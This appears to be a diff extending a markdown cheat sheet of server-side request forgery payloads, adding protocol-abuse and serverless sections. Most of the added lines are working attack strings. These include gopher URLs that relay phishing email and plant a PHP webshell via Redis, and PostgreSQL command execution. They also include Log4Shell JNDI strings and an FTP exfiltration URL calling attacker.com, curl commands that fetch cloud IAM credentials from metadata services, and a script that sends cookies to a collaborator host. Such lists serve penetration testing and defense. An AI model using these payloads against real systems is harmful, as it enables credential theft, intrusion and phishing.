@@ -208,6 +208,111 @@ X-Real-IP: 127.0.0.1
 X-Forwarded-Host: internal.target
 ```
 
+## Protocol Abuse — Extended Coverage
+
+### SMTP/Email SSRF
+```
+gopher://target.com:25/_HELO+localhost%0d%0aMAIL+FROM%3Aattacker%40evil.com%0d%0aRCPT+TO%3Avictim%40target.com%0d%0aDATA%0d%0aSubject%3A+SSRF+Success%0d%0a%0d%0aPwned!%0d%0a.%0d%0aQUIT%0d%0a
+```
+Usage: Send emails via internal SMTP servers, phishing from trusted domain
+
+### LDAP SSRF
+```
+ldap://internal-ldap.target.com:389/cn=admin,dc=target,dc=com
+ldaps://internal-ldap.target.com:636
+```
+Usage: Query internal directory services, extract usernames/groups
+
+### FTP SSRF
+```
+ftp://attacker.com:21/                  # connect to attacker FTP
+ftp://internal.target.com:21/           # scan internal FTP services
+ftp://user:pass@target.com/file.txt     # credentials in URL
+```
+Usage: File exfiltration to attacker-controlled FTP, internal FTP scanning
+
+### Redis via Gopher
+```
+gopher://internal-redis:6379/_config%20set%20dir%20/var/www/html%0d%0aconfig%20set%20dbfilename%20shell.php%0d%0aset%20payload%20%22%3C%3Fphp%20system(%24_GET%5B'cmd'%5D)%3B%3F%3E%22%0d%0asave%0d%0aquit%0d%0a
+```
+Usage: Write webshell via unfired Redis on internal network
+
+### PostgreSQL via Gopher
+```
+gopher://internal-pg:5432/_COPY%20users%20TO%20PROGRAM%20'id'%3B
+```
+Usage: OS command execution via `COPY TO PROGRAM` in PostgreSQL
+
+### MongoDB SSRF
+```
+mongodb://internal-db:27017/test?authSource=admin
+mongodb://internal-db:27017/admin?authMechanism=SCRAM-SHA-1
+```
+Usage: Connect to internal MongoDB, dump databases
+
+### SMTP via Gopher (relay)
+```
+gopher://internal-mail:25/_HELO+attacker%0d%0aMAIL+FROM%3A%3Cssrf%40target.com%3E%0d%0aRCPT+TO%3A%3Cvictim%40target.com%3E%0d%0aDATA%0d%0aFrom%3A+support%40target.com%0d%0aTo%3A+victim%40target.com%0d%0aSubject%3A+Account+Compromised%0d%0a%0d%0aClick+here+to+reset+password%0d%0a.%0d%0aQUIT%0d%0a
+```
+Usage: Send spoofed phishing emails through internal mail relay
+
+### Java/JNDI SSRF (Log4Shell style)
+```
+${jndi:ldap://attacker.com/a}
+${jndi:rmi://attacker.com/a}  
+${jndi:ldaps://attacker.com/a}
+```
+Usage: RCE via JNDI injection in logging/user-agent/headers
+
+## Serverless SSRF
+
+### AWS Lambda
+```
+# SSRF from Lambda → IMDS
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/lambda-exec-role
+
+# Lambda → ECS container metadata
+curl http://169.254.170.2/v2/metadata
+curl http://169.254.170.2/v2/credentials
+
+# Lambda → internal VPC services
+curl http://internal-rds.cluster-xxxxx.us-east-1.rds.amazonaws.com:3306
+```
+
+### Google Cloud Run / Cloud Functions
+```
+# GCP metadata
+curl http://169.254.169.254/computeMetadata/v1/
+curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Header required: Metadata-Flavor: Google
+
+# Cloud Run specific
+curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/attributes/
+```
+
+### Azure Functions
+```
+# Azure IMDS
+curl http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Header required: Metadata: true
+
+# Managed identity token
+curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+# Header required: Metadata: true
+```
+
+### PDF Renderer SSRF
+```
+# wkhtmltopdf / Puppeteer / Chromium renderers
+# Injected into HTML template that gets rendered to PDF
+<img src="http://169.254.169.254/latest/meta-data/">
+<iframe src="http://internal.target.com/admin">
+<script>fetch('http://collab-server/?data='+document.cookie)</script>
+```
+Usage: PDF generators that render user-provided HTML are a common SSRF vector
+
 ## Tools
 
 | Tool | Purpose |
@@ -219,7 +324,8 @@ X-Forwarded-Host: internal.target
 | **rbndr.us / 1u.ms** | DNS rebinding services |
 | **Singularity of Origin** | Advanced DNS rebinding toolkit |
 | **enumXFF** | Enumerate IPs in X-Forwarded-For headers |
+| **Gopher-SSRF** | SMTP/LDAP/Redis payload generation |
 
 ## Output
 
-Successful SSRF produces: cloud IAM credentials, internal service responses, Kubernetes tokens, network topology information, or arbitrary file reads — any of which can escalate to full cloud account takeover or internal network pivoting.
+Successful SSRF produces: cloud IAM credentials (AWS/Azure/GCP), internal service responses (RDS, Redis, LDAP), Kubernetes service account tokens, network topology information, arbitrary file reads via `file://`, or RCE via protocol abuse (Redis cron, PostgreSQL COPY TO PROGRAM) — any of which can escalate to full cloud account takeover or internal network pivoting.
